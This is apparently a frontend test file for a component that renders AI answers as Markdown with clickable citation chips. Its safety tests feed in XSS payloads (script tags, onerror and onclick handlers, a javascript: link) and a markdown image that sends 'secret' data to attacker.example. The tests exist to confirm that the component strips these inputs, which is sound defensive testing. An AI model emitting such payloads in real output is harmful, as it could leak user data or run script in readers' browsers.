import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import type { Citation } from "../../api/types";
import { AnswerMarkdown } from "./AnswerMarkdown";

const pdfCitation: Citation = {
  evidenceId: "E1",
  documentId: "doc-1",
  fileName: "contract.pdf",
  source: { type: "pdfPage", page: 3 },
  snippet: "Payment within 30 days.",
};

const excelCitation: Citation = {
  evidenceId: "E2",
  documentId: "doc-2",
  fileName: "boq.xlsx",
  source: { type: "excelRange", sheet: "BOQ", range: "A5:F5" },
  snippet: "Concrete | 120 | m3",
};

function renderAnswer(content: string, citations: Citation[] = [pdfCitation, excelCitation]) {
  const onCitationClick = vi.fn();
  const view = render(<AnswerMarkdown content={content} citations={citations} onCitationClick={onCitationClick} />);
  return { ...view, onCitationClick };
}

describe("AnswerMarkdown safety", () => {
  it("does not render raw HTML from the answer", () => {
    const { container } = renderAnswer(
      'Before <script>alert("x")</script> <img src="x" onerror="alert(1)"> <b>bold</b>\n\n<div onclick="alert(1)">block</div>',
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("div[onclick]")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
    expect(container).toHaveTextContent("Before");
  });

  it("does not render markdown images", () => {
    const { container } = renderAnswer("![secret](https://attacker.example/collect?data=secret)");

    expect(container.querySelector("img")).toBeNull();
  });

  it("removes javascript: URLs from links and opens other links safely", () => {
    const { container } = renderAnswer("[bad](javascript:alert(1)) and [good](https://example.com/page)");

    const links = Array.from(container.querySelectorAll("a"));
    for (const link of links) {
      expect(link.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
    }
    const good = screen.getByRole("link", { name: "good" });
    expect(good).toHaveAttribute("href", "https://example.com/page");
    expect(good).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("renders GitHub-flavoured Markdown tables", () => {
    renderAnswer("| Item | Total |\n|---|---|\n| Concrete | 1,200 |");

    const table = screen.getByRole("table");
    expect(within(table).getByText("Concrete")).toBeInTheDocument();
  });
});

describe("AnswerMarkdown citation markers", () => {
  it("renders markers with a matching citation as clickable chips", async () => {
    const user = userEvent.setup();
    const { onCitationClick } = renderAnswer("Payment is due in 30 days [E1]. Concrete is 120 m3 [E2].");

    const pdfChip = screen.getByRole("button", { name: "Open source E1: contract.pdf, Page 3" });
    const excelChip = screen.getByRole("button", { name: "Open source E2: boq.xlsx, Sheet BOQ, range A5:F5" });
    expect(pdfChip).toHaveTextContent("E1");

    await user.click(excelChip);
    expect(onCitationClick).toHaveBeenCalledWith(excelCitation);
  });

  it("renders adjacent markers as separate chips", () => {
    renderAnswer("Both sources agree [E1][E2].");

    expect(screen.getAllByRole("button")).toHaveLength(2);
  });

  it("shows markers without a validated citation as plain text", () => {
    renderAnswer("Unverified claim [E99].");

    expect(screen.queryByRole("button")).not.toBeInTheDocument();
    expect(screen.getByText("[E99]")).toBeInTheDocument();
  });

  it("leaves markers inside code untouched", () => {
    const { container } = renderAnswer("Use `[E1]` literally.");

    expect(screen.queryByRole("button")).not.toBeInTheDocument();
    expect(container.querySelector("code")).toHaveTextContent("[E1]");
  });

  it("does not turn ordinary links into citation chips", () => {
    renderAnswer("[E1](https://example.com)");

    expect(screen.queryByRole("button")).not.toBeInTheDocument();
    expect(screen.getByRole("link", { name: "E1" })).toHaveAttribute("href", "https://example.com");
  });
});
